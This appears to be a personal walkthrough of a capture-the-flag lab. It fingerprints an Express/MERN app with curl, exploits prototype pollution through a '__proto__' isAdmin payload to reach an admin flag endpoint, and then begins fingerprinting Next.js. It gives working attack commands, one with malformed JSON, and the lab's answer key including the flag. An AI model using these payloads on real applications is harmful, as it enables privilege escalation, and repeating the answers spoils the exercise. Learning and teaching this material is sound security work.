MERN Stack: The stack (MangoDB, Express.js,React, Node.js) powers a large share of modern SaaS products, internal tools and API Backends. Express is the most deployed Node.js web framework.

Stack Identity : 

MERN apps are the default choice for java script only shops that want one language across the full stack. On ubantu, the typical deployment is node.js from the NodeSource PPA. Express listening portis 5000 or 3000 and Mango DB port is 27017.

A reverse proxy (usually Nginx) sits in front in production, but in misconfigured environments and internal tools, the Express process is often directly exposed.

**Fingerprinting the MERN Stack:**

Lets start with header check:

curl -I 10.64.186.232:3000/

Results obtained are as below:

![Header_check](../../Images/header_check_mern.png)

Look for these responses

| Signal | Value |
|--------|-------|
| X-Powered-By header| Express |
| Set-Cookie header | connect.sid=s%3A... |
| Unhandled route response | Cannot GET /nonexistent (plain text) |
| Frontend root element | In the HTML Body |

X-Powered-By: Express is the primary signal. Express sends this header on every response by default. It is only absent if the developer explicitly called app.disable('x-powered-by') or added the Helmet middleware.

If X-Powered-By is absent, fall back to cookie name and unhandled-route format as secondary signals.

The connect.sid cookie comes from the express-session middleware. It is present when the app uses express-session with saveUninitialized: true (the default for many apps). With saveUninitialized: false, the recommended setting for login sessions, the cookie only appears after a session is created. Absence of connect.sid does not rule out Express.

To confirm the Expres unhandled-route fingerprint, request a nonexistent path from the Attackbox

Run curl http://10.64.186.232:3000/nonexistent

![Express_unhandled-route_fingerprint_check](../../Images/express_unhandled_route_fingerprint_check.png)

An Express app with default settings returns plain text: Cannot GET /nonexistent. This is distinct from Django (which shows an HTML error page), Apache (which shows a styled 403 or 404), and Next.js (which returns an HTML page with a styled error). That plain-text response is unambiguous.

Exploiting MERN:

We have confirmed that the Stack: Express on port 3000 with connect.sid session cookie. In a pentest against a MERN application, the next step after fingerprinting is API surface enumeration. MERN apps commonly expose JSON APIs for profile updates, preferences, and user settings, and developers often write their own utility functions to apply partial updates to user objects. Those utility functions are where prototype pollution typically lives.

As per the details mentioned, the app on port 3000 exposes two endpoints:

/api/user/update ---> Post ----> accepts Json and mergers it into session user object
/api/admin/flag ----> Get -----> Returns a flag if requesting user has admin access.

So first you need to save your session cookies, that can be done by using curl -c cookies.txt http://Machine_IP:3000/

Now try to access the admin portal using the cookies you saved: curl -b cookies.txt http://Machine_IP:3000/api/admin/flag --> you will get an error as not authorized which is accepted , as you are regular session user who does not have isAdmin property.

Now we need update an username and email address change to the database, lets check if updating by using:

curl -b cookies.txt -X POST http://Machine_IP:3000/api/user/update -H "Content-Type: application/json" -d '{"name": "Alice", "email":"alice@example.com"}' 

when you run this query --> you get that the status as been updated. So we know that the endpoint accespts arbitary JSON keys and merges them into the user object with no key filterting. The merge fuction here is the attack surface.

Every JavaScript object inherits from a shared root called Object.prototype. When a merge function receives {"proto": {"isAdmin": true}} without filtering the proto key, it writes isAdmin: true directly onto Object.prototype, not onto any individual user object. Every object in the Node.js process that looks up .isAdmin will then find true via the prototype chain, even if the property was never explicitly set on that object. The admin flag endpoint checks currentUser.isAdmin on a plain session object with no own isAdmin property, making it the exact target. Some hardened deployments filter __proto__ at the input layer; in those cases, the constructor.prototype path ({"constructor": {"prototype": {"isAdmin": true}}}) reaches Object.prototype through a different route and can bypass those filters. You can learn more about the Prototype Pollution room.

When the payload {"__proto__": {"isAdmin": true}} reaches this function, it finds __proto__ in the source keys, sees it is an object, and recurses. Inside the recursion, target["__proto__"] is a reference to Object.prototype not a regular key, so it sets Object.prototype.isAdmin = true. The admin route then reads currentUser.isAdmin, finds no own property, walks the prototype chain, and returns the flag.

so this can be done by running the command :

curl -b cookies.txt -X POST http://Machine_IP:3000/api/user/update -H "Content-Type: application/json" -d '{"__proto__:" {"isAdmin": true}}'

The server responds with {"status":"updated"}. The merge has run and Object.prototype.isAdmin is now true in the Node.js process.

Now let's request for the flag --> that is done by running 

curl -b cookies.txt http://Machine_IP:3000/api/admin/flag

**Questions:**

What HTTP response header confirms an Express.js backend is running? (Answer Format: Header-Name: 
Value): X-Powered-By: Express

What is the name of the Express session cookie you will use to replay requests after polluting the prototype? (Answer Format: cookie-name) --> connect.sid

Send the prototype pollution payload to the merge endpoint. What is the flag returned by the admin route after the bypass succeeds? --> THM{pr0t0_p0llut3d}

**React/Next.js**

Express is the Foundation of the MERN Stack we just exploited.Next.js builds on top of it, adding abstractions like the App Router, React Server Components, and middleware that create a different and more severe attack surface.

**Stack Identity**

Next.js is the dominant React framework for production applications. It is what you will find behind most investor dashboards, customer portals, and marketing sites built in the last three years. On Ubuntu, it runs as a Node.js process under a dedicated user (node or www-data), typically started with npm start after npm run build. The App Router (introduced in Next.js 13, default since 14) enables React Server Components, which make the CVEs CVE-2025-29927(opens in new tab) and CVE-2025-55182(opens in new tab) possible.

**Fingerprinting Next.js**

Since port 3000 --> we already know this is running port 3000, automatically when we start npm run dev --> it automatically assignes to port 3001. So lets run the command.

curl -I http://Machine_IP:3001 --> which gives the following result as shown below:

![Next.js_Fingerprinting](../../Images/Fingerprinting _Next.js.png)

| Signal                      | Value                                       | Confidence                  |                                                                                                                                                                                   
| --------------------------- | ------------------------------------------- | --------------------------- | 
| X-Powered-By header         | `Next.js`                                   | High                        |
| HTML source                 | `window.__next_f` present in HTML           | High (App Router indicator) |                                                                   |
| Static asset paths          | `/_next/static/chunks/`                     | High                        | 
| Middleware headers          | `x-middleware-rewrite`, `x-middleware-next` | Medium                      |
| Redirect to protected route | HTTP `307` → `/login`                       | Medium                      | 





















